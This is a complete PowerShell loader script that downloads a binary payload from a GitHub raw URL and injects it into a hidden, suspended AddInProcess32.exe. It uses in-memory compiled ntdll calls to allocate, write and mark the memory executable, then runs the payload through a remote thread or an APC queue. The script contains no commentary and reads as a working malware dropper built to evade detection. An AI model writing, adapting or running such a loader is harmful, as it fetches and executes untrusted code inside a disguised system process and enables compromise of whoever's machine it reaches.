param(
    [string]$Url = "https://github.com/i25968627-ui/crispy-spoon/raw/refs/heads/main/nfasiv.bin",
    [switch]$RequireRWX,
    [switch]$UseApc,
    [switch]$NoMonitor
)

function Write-Log {
    param([string]$Message)
    Write-Host "[$(Get-Date -Format 'HH:mm:ss.fff')] $Message"
}

# ============================================================
# Native API layer — in-memory compile, no temp DLL
# ============================================================

$cp = New-Object System.CodeDom.Compiler.CompilerParameters
$cp.GenerateInMemory = $true
$cp.GenerateExecutable = $false
$cp.IncludeDebugInformation = $false

Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class EniNative {
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    public static extern bool CreateProcessW(
        IntPtr lpApplicationName,
        IntPtr lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        IntPtr lpCurrentDirectory,
        IntPtr lpStartupInfo,
        IntPtr lpProcessInformation);

    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();

    [DllImport("ntdll.dll")]
    public static extern uint NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        uint AllocationType,
        uint Protect);

    [DllImport("ntdll.dll")]
    public static extern uint NtWriteVirtualMemory(
        IntPtr ProcessHandle,
        IntPtr BaseAddress,
        byte[] Buffer,
        uint NumberOfBytesToWrite,
        out uint NumberOfBytesWritten);

    [DllImport("ntdll.dll")]
    public static extern uint NtProtectVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref IntPtr RegionSize,
        uint NewProtect,
        out uint OldProtect);

    [DllImport("ntdll.dll")]
    public static extern uint NtCreateThreadEx(
        out IntPtr ThreadHandle,
        uint DesiredAccess,
        IntPtr ObjectAttributes,
        IntPtr ProcessHandle,
        IntPtr StartAddress,
        IntPtr Parameter,
        bool CreateSuspended,
        uint StackZeroBits,
        uint SizeOfStackCommit,
        uint SizeOfStackReserve,
        IntPtr BytesBuffer);

    [DllImport("ntdll.dll")]
    public static extern uint NtQueueApcThread(
        IntPtr ThreadHandle,
        IntPtr ApcRoutine,
        IntPtr ApcArgument1,
        IntPtr ApcArgument2,
        IntPtr ApcArgument3);

    [DllImport("ntdll.dll")]
    public static extern uint NtResumeThread(
        IntPtr ThreadHandle,
        out uint SuspendCount);

    [DllImport("kernel32.dll")]
    public static extern bool CloseHandle(IntPtr Handle);
}
"@ -CompilerParameters $cp

# ============================================================
# Host selection
# ============================================================

$hostPath = $null
foreach ($dir in @(
    "C:\Windows\Microsoft.NET\Framework\v4.0.30319",
    "C:\Windows\Microsoft.NET\Framework\v2.0.50727",
    "C:\Windows\Microsoft.NET\Framework64\v4.0.30319",
    "C:\Windows\Microsoft.NET\Framework64\v2.0.50727"
)) {
    $candidate = Join-Path $dir "AddInProcess32.exe"
    if (Test-Path $candidate) { $hostPath = $candidate; break }
}
if (-not $hostPath) { throw "AddInProcess32.exe not found" }
Write-Log "Host: $hostPath"

# ============================================================
# Create suspended host
# ============================================================

$siSize = if ([IntPtr]::Size -eq 8) { 104 } else { 68 }
$piSize = if ([IntPtr]::Size -eq 8) { 24 } else { 16 }
$siPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($siSize)
$piPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($piSize)
[System.Runtime.InteropServices.Marshal]::WriteInt32($siPtr, 0, $siSize)
for ($i = 4; $i -lt $siSize; $i += 8) { [System.Runtime.InteropServices.Marshal]::WriteInt64($siPtr, $i, 0) }
for ($i = 0; $i -lt $piSize; $i += 8) { [System.Runtime.InteropServices.Marshal]::WriteInt64($piPtr, $i, 0) }

$cmdLine = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni("`"$hostPath`"")
try {
    $ok = [EniNative]::CreateProcessW([IntPtr]::Zero, $cmdLine, [IntPtr]::Zero, [IntPtr]::Zero, $false, 0x08000004, [IntPtr]::Zero, [IntPtr]::Zero, $siPtr, $piPtr)
} finally {
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($cmdLine)
}
if (-not $ok) { throw "CreateProcessW failed" }

$hProcess = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($piPtr, 0)
$hThread = [System.Runtime.InteropServices.Marshal]::ReadIntPtr($piPtr, [IntPtr]::Size)
$procId = [System.Runtime.InteropServices.Marshal]::ReadInt32($piPtr, [IntPtr]::Size * 2)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($siPtr)
[System.Runtime.InteropServices.Marshal]::FreeHGlobal($piPtr)
Write-Log "Suspended host spawned. PID: $procId"

# ============================================================
# Download payload
# ============================================================

Write-Log "Downloading payload..."
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$wc = New-Object System.Net.WebClient
$wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
$payload = $wc.DownloadData($Url)
$payloadLen = $payload.Length
Write-Log "Payload: $payloadLen bytes"

# ============================================================
# Allocate, write, protect
# ============================================================

$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_READWRITE = 0x04
$PAGE_EXECUTE_READ = 0x20
$PAGE_EXECUTE_READWRITE = 0x40

$baseAddress = [IntPtr]::Zero
$regionSize = [IntPtr]$payloadLen
$status = [EniNative]::NtAllocateVirtualMemory($hProcess, [ref]$baseAddress, [IntPtr]::Zero, [ref]$regionSize, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_READWRITE)
if ($status -ne 0) { throw "NtAllocateVirtualMemory failed: 0x$($status.ToString('X8'))" }
Write-Log "Allocated 0x$($baseAddress.ToString('X'))"

$bytesWritten = 0
$status = [EniNative]::NtWriteVirtualMemory($hProcess, $baseAddress, $payload, [uint32]$payloadLen, [ref]$bytesWritten)
if ($status -ne 0) { throw "NtWriteVirtualMemory failed: 0x$($status.ToString('X8'))" }
Write-Log "Wrote $bytesWritten bytes"

$payload = $null
[System.GC]::Collect()

$finalProtect = if ($RequireRWX) { $PAGE_EXECUTE_READWRITE } else { $PAGE_EXECUTE_READ }
$oldProtect = 0
$status = [EniNative]::NtProtectVirtualMemory($hProcess, [ref]$baseAddress, [ref]$regionSize, $finalProtect, [ref]$oldProtect)
if ($status -ne 0) { throw "NtProtectVirtualMemory failed: 0x$($status.ToString('X8'))" }
Write-Log "Memory protection: $(if($RequireRWX){'RWX'}else{'RX'})"

# ============================================================
# Execute
# ============================================================

if ($UseApc) {
    Write-Log "Queueing APC on main thread..."
    $status = [EniNative]::NtQueueApcThread($hThread, $baseAddress, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
    if ($status -ne 0) { throw "NtQueueApcThread failed: 0x$($status.ToString('X8'))" }
    $suspendCount = 0
    $status = [EniNative]::NtResumeThread($hThread, [ref]$suspendCount)
    if ($status -ne 0) { throw "NtResumeThread failed: 0x$($status.ToString('X8'))" }
    Write-Log "APC fired; thread resumed"
} else {
    Write-Log "Creating remote thread..."
    $threadHandle = [IntPtr]::Zero
    $status = [EniNative]::NtCreateThreadEx([ref]$threadHandle, 0x1FFFFF, [IntPtr]::Zero, $hProcess, $baseAddress, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
    if ($status -ne 0) { throw "NtCreateThreadEx failed: 0x$($status.ToString('X8'))" }
    [void][EniNative]::CloseHandle($threadHandle)
    Write-Log "Thread created at 0x$($baseAddress.ToString('X'))"
}

[void][EniNative]::CloseHandle($hThread)
[void][EniNative]::CloseHandle($hProcess)

if ($NoMonitor) {
    Write-Log "Injection complete. Exiting."
    exit
}

# ============================================================
# Monitor
# ============================================================

Write-Log "Monitoring target..."
$proc = Get-Process -Id $procId -ErrorAction SilentlyContinue
while ($proc -and -not $proc.HasExited) {
    $proc.Refresh()
    $ws = [math]::Round($proc.WorkingSet64 / 1KB, 2)
    $tc = 0
    try { $tc = $proc.Threads.Count } catch {}
    Write-Log "PID $procId | WS: ${ws} KB | Threads: $tc"
    Start-Sleep -Seconds 5
    $proc = Get-Process -Id $procId -ErrorAction SilentlyContinue
}

try { Write-Log "Target exited with code: $($proc.ExitCode)" } catch { Write-Log "Target exited." }
Write-Log "Done."
